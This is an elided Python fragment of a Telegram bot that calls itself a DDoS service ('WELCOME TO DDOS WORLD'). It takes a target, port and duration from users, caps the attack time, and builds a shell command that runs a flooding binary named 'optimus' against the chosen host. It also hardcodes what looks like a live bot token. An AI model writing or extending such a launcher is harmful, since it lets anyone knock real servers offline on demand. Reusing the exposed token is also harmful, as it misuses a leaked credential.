...
bot = telebot.TeleBot('6098885239:AAE-TbuFPnsJk2wKQ6nEABJDaUYQvcvXb-c')
...
def start_command(message):
    ...
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢  𝐃𝐃𝐎𝐒 𝐖𝐎𝐑𝐋𝐃!", reply_markup=markup)
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./optimus {target} {port} {attack_time} 1200"  # ✅ Correct variable name
